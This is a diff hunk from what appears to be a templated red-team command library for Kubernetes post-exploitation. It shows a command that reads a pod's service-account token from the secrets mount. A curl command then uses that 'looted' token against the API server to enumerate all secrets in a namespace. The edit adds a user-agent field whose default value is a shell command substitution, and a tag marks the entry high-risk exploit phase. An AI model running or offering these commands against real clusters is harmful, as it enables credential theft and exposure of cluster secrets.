@@ -240,7 +240,7 @@ cat /var/run/secrets/kubernetes.io/serviceaccount/token; echo; cat /var/run/secr
 Use a looted service-account token to hit the API server directly and enumerate secrets.
 
 ```bash
-curl -sk -H "Authorization: Bearer {{TOKEN:str:eyJ...}}" {{KUBE_API:url:https://kubernetes.default.svc}}/api/v1/namespaces/{{NAMESPACE:str:default}}/secrets
+curl -sk -H "Authorization: Bearer {{TOKEN:str:eyJ...}}" -A "{{UA:str:$(q-ua)}}" {{KUBE_API:url:https://kubernetes.default.svc}}/api/v1/namespaces/{{NAMESPACE:str:default}}/secrets
 ```
 
 <!-- meta: risk=high | phase=exploit | tags=api,token,curl,secrets,enum -->
